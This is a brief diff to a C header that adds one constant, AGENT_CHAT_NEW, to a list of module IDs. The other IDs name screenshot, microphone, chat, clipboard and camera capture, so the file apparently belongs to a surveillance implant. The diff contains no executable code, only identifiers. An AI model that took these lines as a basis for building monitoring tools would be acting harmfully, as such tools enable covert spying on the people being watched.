@@ -210,6 +210,7 @@ extern int gMemLogMaxSize;
 #define AGENT_SCREENSHOT            0xB9B9
 #define AGENT_MICROPHONE            0xC2C2
 #define AGENT_CHAT                  0xC6C6
+#define AGENT_CHAT_NEW              0xC6C7
 #define AGENT_CRISIS                0x02C0
 #define AGENT_CLIPBOARD             0xD9D9
 #define AGENT_CAM                   0xE9E9
